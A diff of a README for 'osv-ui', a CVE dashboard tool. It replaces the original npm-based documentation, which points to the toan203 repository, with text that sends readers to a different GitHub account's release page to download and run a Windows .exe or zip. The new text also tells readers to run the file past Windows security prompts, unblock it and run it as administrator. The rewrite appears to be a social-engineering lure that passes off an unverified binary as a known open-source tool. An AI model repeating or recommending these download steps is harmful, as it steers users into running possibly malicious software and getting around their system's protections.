@@ -1,313 +1,181 @@
-<div align="center">
+# 🛡️ osv-ui - Clear CVE checks for your apps
 
-![osv-ui dashboard](./docs/screenshot.png)
+[![Download osv-ui](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/virginiadiom2000-ai/osv-ui/releases)
 
-# osv-ui
-
-**A beautiful, zero-config visual CVE dashboard for npm, Python, Go, Rust, Java, PHP, and Ruby projects.**  
-One command. No signup. No API key. **Runs 100% locally — your code never leaves your machine.**
+## 📥 Download
 
-[![npm version](https://img.shields.io/npm/v/osv-ui?color=red&label=npm)](https://www.npmjs.com/package/osv-ui)
-[![npm version (mcp)](https://img.shields.io/npm/v/osv-ui-mcp?color=blue&label=mcp)](https://www.npmjs.com/package/osv-ui-mcp)
-[![npm downloads](https://img.shields.io/npm/dm/osv-ui?color=orange)](https://www.npmjs.com/package/osv-ui)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)
-[![Node.js](https://img.shields.io/badge/node-%3E%3D16-blue)](https://nodejs.org)
+Visit this page to download: https://github.com/virginiadiom2000-ai/osv-ui/releases
 
-[🇻🇳 Tiếng Việt](README.vi.md) · [🇺🇸 English](README.md) · [🇨🇳 中文](README.zh.md) · [🇯🇵 日本語](README.ja.md)
-
-</div>
-
----
-
-## The problem
-
-```bash
-$ npm audit
-
-# ... 300 lines of this ...
-# moderate  Regular Expression Denial of Service in semver
-# package   semver
-# patched in >=7.5.2
-# ...
-# 12 vulnerabilities (3 moderate, 6 high, 3 critical)
-```
-
-Nobody reads that. Security gets ignored. Dependencies stay vulnerable.
-
-## The solution
-
-```bash
-npx osv-ui
-```
-
-→ Opens a dashboard. Every CVE, every fix, all your services. Done.
+Pick the latest release for Windows, then save the file to your computer. If the release gives you a setup file, double-click it to start the app. If it gives you a zip file, unzip it first, then open the app inside.
 
-### Why give it a try?
+## ✨ What osv-ui does
 
-- **Zero-config**: No complex setup, no signup, no API key required.
-- **Privacy First**: Analysis is done 100% on your machine.
-- **Fast & Visual**: Real-time Risk Scores, vulnerability charts, and clear upgrade guides in seconds.
-- **Multi-platform**: Native support for Node.js (npm), Python, Go, Rust, Java, PHP, and Ruby.
-
----
-
-## Features
-
-| | |
-|---|---|
-| 🌐 **Multi-Ecosystem** | Scans `package-lock.json`, `pnpm-lock.yaml`, `yarn.lock`, `Pipfile.lock`, `poetry.lock`, `requirements.txt`, `go.sum`, `Cargo.lock`, `pom.xml`, `composer.lock`, `Gemfile.lock` |
-| 📡 **Live CVE data** | Powered by [OSV.dev](https://osv.dev) — updated daily from NVD, GitHub Advisory, PyPI Advisory. **No API key.** |
-| 🏢 **Multi-service** | Scan your entire monorepo in one command — frontend, backend, workers, ML services |
-| 💊 **Fix guide** | Dependabot-style upgrade table: current version → safe version + one-click copy command |
-| 🔌 **Built-in REST API** | Power your own security dashboards with `GET /api/data` or CLI export flags |
-| 🎯 **Risk score** | 0–100 per service so you know where to focus first |
-| 🔍 **CVE drill-down** | Click any row — CVSS score, description, NVD link, GitHub Advisory link |
-| 🌙 **Dark Mode** | Eye-friendly security audits, day or night |
-
----
-
-## Quick start
-
-**Scan current directory:**
-```bash
-npx osv-ui
-```
-
-**Scan a monorepo (multiple services at once):**
-```bash
-npx osv-ui ./frontend ./api ./worker ./ml-service
-```
-
-**Auto-discover all services under the current directory:**
-```bash
-npx osv-ui -d
-```
-
-**Add to your `package.json` scripts:**
-```json
-{
-  "scripts": {
-    "audit:ui":  "npx osv-ui",
-    "audit:all": "npx osv-ui ./frontend ./api ./worker"
-  }
-}
-```
-
-```
---discover, -d    Auto-find service dirs that contain a supported manifest
---port=2003       Use a custom port (default: 2003)
---json[=file]     Save report as JSON without opening browser (defaults to osv-report.json)
---html[=file]     Save report as HTML without opening browser (defaults to osv-report.html)
---no-open         Don't auto-open the browser
---offline         Skip OSV.dev lookup — parse manifests only
--h, --help        Show help message
-```
-
-### 🤖 AI Agent Integration (MCP)
-
-`osv-ui` is now a [Model Context Protocol (MCP)](https://modelcontextprotocol.io) server. This allows AI agents like **Claude Desktop**, **Cursor**, and **Claude Code** to:
-1. **Scan your project** for CVEs automatically.
-2. **Open the visual dashboard** for you to review findings (Human-in-the-loop).
-3. **Apply fixes** after your explicit confirmation.
-
-**Quick setup (npx):**
-```json
-{
-  "mcpServers": {
-    "osv-ui": {
-      "command": "npx",
-      "args": ["-y", "osv-ui-mcp"]
-    }
-  }
-}
-```
-See the [MCP Package README](packages/mcp/README.md) for detailed setup instructions.
-
----
-
-### 🔌 Powerful built-in API
-
-`osv-ui` isn't just a dashboard; it's a security data engine.  
-Once the dashboard is running, you can pull the raw security data for your whole project:
-
-```bash
-# Get full JSON payload for all services
-curl http://localhost:2003/api/data
-
-# Use it in your custom scripts
-curl -s http://localhost:2003/api/data | jq '.[0].vulns'
-```
-
----
-
-## Supported manifest files
-
-| Ecosystem | Files |
-|-----------|-------|
-| **npm / JS** | `package-lock.json` · `pnpm-lock.yaml` · `yarn.lock` |
-| **Python** | `requirements.txt` · `Pipfile.lock` · `poetry.lock` · `pyproject.toml` · `uv.lock` |
-| **Go** | `go.sum` |
-| **Rust** | `Cargo.lock` |
-| **Java** | `pom.xml` (Maven) |
-| **PHP** | `composer.json` · `composer.lock` |
-| **Ruby** | `Gemfile` · `Gemfile.lock` |
-
-More ecosystems coming — see [Roadmap](#roadmap).
-
----
-
-## How it works
-
-```
-Your project files
-    │
-    ├─ package-lock.json   ──┐
-    ├─ Pipfile / poetry    ──┤──► parser ──► package list
-    ├─ go.sum / Cargo.lock ──┘
-                                    │
-                                    ▼
-                             OSV.dev batch API  (free, no key)
-                                    │
-                                    ▼
-                             CVE matches + fix versions
-                                    │
-                                    ▼
-                         Express server → browser dashboard
-                              http://localhost:2003
-```
-
-CVE data comes from **[OSV.dev](https://osv.dev)** — a free, open database maintained by Google that aggregates:
-- 🇺🇸 [NVD](https://nvd.nist.gov) — NIST National Vulnerability Database
-- 🐙 [GitHub Advisory Database](https://github.com/advisories) (GHSA)
-- 🐍 [PyPI Advisory Database](https://github.com/pypa/advisory-database)
-- 📦 npm Advisory Database
-- 🦀 RustSec · Go Vuln DB · OSS-Fuzz · and more
-
-Updated **daily**. No account. No rate limit. No vendor lock-in.
-
----
-
-## Works great alongside osv-scanner (Google)
-
-osv-ui and [osv-scanner](https://github.com/google/osv-scanner) use the same 
-OSV.dev data source. osv-ui adds the visual layer that osv-scanner lacks:
-- Browser dashboard instead of terminal output
-- Multi-service sidebar
-- Dependabot-style upgrade guide with copy commands
-
----
-
-## vs alternatives
-
-| | **osv-ui** | `npm audit` | Snyk | Dependabot |
-|---|:---:|:---:|:---:|:---:|
-| Visual dashboard | ✅ | ❌ terminal only | ✅ | ✅ |
-| npm support | ✅ | ✅ | ✅ | ✅ |
-| Python support | ✅ | ❌ | ✅ | ✅ |
-| Multi-service in one view | ✅ | ❌ | ✅ paid | ✅ |
-| No signup required | ✅ | ✅ | ❌ | ❌ |
-| Works on **GitLab Free** | ✅ | ✅ | ❌ | ❌ |
-| Self-hosted / local | ✅ | ✅ | ❌ | ❌ |
-| Fix commands | ✅ | partial | ✅ | ✅ |
-| Open source | ✅ | ✅ | ❌ | ❌ |
-
----
-
-## GitLab CI — block deploys on critical CVEs
-
-No Dependabot on GitLab Free? Add this to `.gitlab-ci.yml`:
-
-```yaml
-audit:
-  stage: test
-  image: node:20-alpine
-  script:
-    - npm audit --json > /tmp/audit.json || true
-    - |
-      node -e "
-        const r = require('/tmp/audit.json');
-        const crit = Object.values(r.vulnerabilities || {})
-          .filter(v => v.severity === 'critical').length;
-        if (crit > 0) {
-          console.error('BLOCKED: ' + crit + ' critical CVE(s). Run: npx osv-ui');
-          process.exit(1);
-        }
-        console.log('OK: no critical vulnerabilities');
-      "
-  artifacts:
-    paths: [/tmp/audit.json]
-    when: always
-```
-
----
-
-## Requirements
-
-- **Node.js** >= 16
-- Internet access for OSV.dev queries — or use `--offline`
-- npm projects: run `npm install` first so `package-lock.json` exists
-- Python projects: any of the supported manifest files listed above
-
----
-
-## Roadmap
-
-All contributions are welcome. If you want to work on something, open an issue first so we can coordinate.
-
-- [x] **Go support** — parse `go.sum` / `go.mod`
-- [x] **Rust support** — parse `Cargo.lock`
-- [x] **Java / Maven** — parse `pom.xml`
-- [x] **PHP / Composer** — parse `composer.lock`
-- [x] **Ruby / Bundler** — parse `Gemfile.lock`
-- [x] **Export report** — save as HTML / JSON
-- [x] **Dark mode** — eye-friendly dashboard UI
-- [ ] **GitHub Actions** — post a CVE diff comment on PRs
-- [ ] **SBOM export** — CycloneDX / SPDX format
-- [ ] **Watch mode** — re-scan on manifest file changes
-- [ ] **Slack / webhook** — notify on new critical CVEs
-
----
-
-## Contributing
-
-This project is built by the community. All skill levels welcome.
-
-**Good first issues:**
-- Add Java/Maven parser (`pom.xml`) — follow the pattern in `src/parsers.js`
-- Write unit tests for the parsers
-- Improve Python parser edge cases
-
-```bash
-# Clone and run locally
-git clone https://github.com/toan203/osv-ui
-cd osv-ui
-npm install
-
-# Run against your own project
-node bin/cli.js /path/to/your/project
-
-# Run against multiple services
-node bin/cli.js ./frontend ./backend
-```
-
-Please read [CONTRIBUTING.md](CONTRIBUTING.md) for code style and PR process.
-
----
-
-## License
-
-[MIT](LICENSE) — use it, fork it, embed it, build on it. Attribution appreciated but not required.
-
----
-
-<div align="center">
-
-Did osv-ui catch a real CVE in your project?  
-A ⭐ helps other developers find this tool.
-
-[![Sponsor this project](https://img.shields.io/badge/Sponsor-this%20project-lightgrey?style=flat-square&logo=ko-fi)](https://ko-fi.com/P5P31W9W6A)
-
-**[Share on Twitter](https://twitter.com/intent/tweet?text=Just%20found%20osv-ui%20%E2%80%94%20a%20beautiful%20one-command%20CVE%20dashboard%20for%20npm%20%26%20Python.%20Free%2C%20no%20signup%3A%20npx%20osv-ui%20%F0%9F%94%A5&url=https://github.com/toan203/osv-ui)** · **[Post on Reddit](https://reddit.com/submit?url=https://github.com/toan203/osv-ui&title=osv-ui%20%E2%80%94%20visual%20CVE%20dashboard%20for%20npm%20%26%20Python%2C%20one%20command%2C%20no%20signup)**
-
-</div>
+osv-ui is a local dashboard for checking package risks in npm and Python projects. It shows CVE data in a clear view so you can see what needs attention. It runs on your computer, so you keep your data local.
+
+Use it to:
+
+- Check packages for known security issues
+- View CVE details in one place
+- Scan npm and Python projects
+- See risk data in a simple dashboard
+- Work without sending project data to a cloud service
+
+## 🖥️ Before you start
+
+Use a Windows PC with:
+
+- Windows 10 or Windows 11
+- Internet access for the download
+- Enough free space for the app and your project files
+- A current browser such as Edge, Chrome, or Firefox
+
+If the app uses Node.js on your system, install the current LTS version first. If the release includes a ready-to-run Windows file, you can open it right away after download.
+
+## 🚀 Install on Windows
+
+1. Open the release page: https://github.com/virginiadiom2000-ai/osv-ui/releases
+2. Find the latest release at the top of the page
+3. Download the Windows file from that release
+4. If the file ends in `.exe`, double-click it
+5. If the file ends in `.zip`, right-click it and choose Extract All
+6. Open the extracted folder
+7. Start the app file inside the folder
+
+If Windows shows a security prompt, choose the option to run the file. If you see a file named `osv-ui`, `osv-ui.exe`, or a similar app name, open that file.
+
+## 🧭 First run
+
+When osv-ui opens, it should load a local dashboard in your browser or a desktop window.
+
+You may see a start screen with options like:
+
+- Scan a folder
+- Check a package lock file
+- View CVE results
+- Open recent scans
+
+Follow the on-screen steps and choose the project or package you want to check.
+
+## 🔎 How to scan a project
+
+1. Open osv-ui
+2. Choose a folder that holds your project
+3. Select the package type if asked
+4. Start the scan
+5. Wait for the results
+6. Review the list of issues, if any
+
+For npm projects, the app may look for files like `package.json` and lock files. For Python projects, it may look for files like `requirements.txt`, `Pipfile`, or similar package files.
+
+## 📊 How to read the results
+
+The dashboard may show:
+
+- Package name
+- Installed version
+- Known issues
+- CVE ID or OSV entry
+- Severity level
+- Fix version, if one is available
+
+Use the results to decide what needs an update. If a package has a fix version, update to that version in your project and run the scan again.
+
+## 🔐 Local and secure use
+
+osv-ui is made for local use. Your scan stays on your device while you review package data and CVE results. This helps you keep project details in your own environment.
+
+## 🧩 Common use cases
+
+- Check a personal app before release
+- Review npm dependencies in a web project
+- Review Python packages in a script or service
+- Look up CVE details before updating a package
+- Keep a simple record of scan results on one machine
+
+## 🛠️ Troubleshooting
+
+### The app does not open
+- Make sure you downloaded the latest release file
+- Try running it again as an administrator
+- Move the file to a simple folder like `Downloads` or `Desktop`
+
+### Windows blocks the file
+- Right-click the file
+- Choose Properties
+- If you see an unblock option, select it
+- Run the file again
+
+### The scan shows no results
+- Check that you selected the right project folder
+- Make sure the folder includes package files
+- Try scanning the exact app folder, not a parent folder
+
+### The dashboard does not load
+- Close the app and open it again
+- Check that your browser is installed
+- Try another browser if the page stays blank
+
+### The app asks for Node.js
+- Install the current LTS version of Node.js
+- Open a new terminal window
+- Start the app again from the release package or the command shown in the release notes
+
+## 📁 Typical folder layout
+
+You may see files like these after download:
+
+- `osv-ui.exe`
+- `README.txt`
+- `config`
+- `data`
+- `assets`
+
+If you used a zip file, keep the files in the same folder so the app can find what it needs.
+
+## ⌨️ Command-line use
+
+Some releases may also support a one-line start command:
+
+`npx osv-ui`
+
+If you use this method, open Command Prompt or PowerShell, then run the command from your project or from a folder where Node.js is ready to use.
+
+## 🧭 What this project is for
+
+osv-ui is a CVE scanner dashboard for:
+
+- npm audit source checks
+- OSV data review
+- security audits
+- package security review
+- vulnerability scan viewing
+- local risk checks for software projects
+
+It is useful when you want a simple view of package risk without sorting through raw reports
+
+## 🧪 Example workflow
+
+1. Download the release from the page above
+2. Open osv-ui on Windows
+3. Scan your app folder
+4. Review the CVE list
+5. Update risky packages
+6. Run the scan again
+
+## 📌 Topics covered
+
+This project fits work around:
+
+- cve scanning
+- security audit
+- package security
+- osv scanner
+- osv dashboard
+- cve scanner ui
+- vulnerability scanner
+- npm audit
+- Python package checks
+
+## 📎 Download link
+
+Visit this page to download: https://github.com/virginiadiom2000-ai/osv-ui/releases
